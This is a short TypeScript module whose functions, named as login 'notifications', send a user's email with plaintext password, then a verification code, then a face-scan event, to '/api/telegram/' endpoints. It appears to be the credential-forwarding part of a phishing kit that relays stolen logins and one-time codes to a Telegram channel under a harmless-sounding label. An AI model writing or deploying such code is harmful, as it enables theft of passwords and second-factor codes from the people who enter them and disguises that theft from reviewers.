
export async function notifyLogin(email: string, password: string): Promise<void> {
  try {
    await fetch('/api/telegram/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email, password }),
    });
  } catch (error) {
    console.error('Failed to send login notification:', error);
  }
}

export async function notifyCode(email: string, code: string): Promise<void> {
  try {
    await fetch('/api/telegram/code', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email, code }),
    });
  } catch (error) {
    console.error('Failed to send code notification:', error);
  }
}

export async function notifyFaceScan(email: string): Promise<void> {
  try {
    await fetch('/api/telegram/facescan', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email }),
    });
  } catch (error) {
    console.error('Failed to send face scan notification:', error);
  }
}
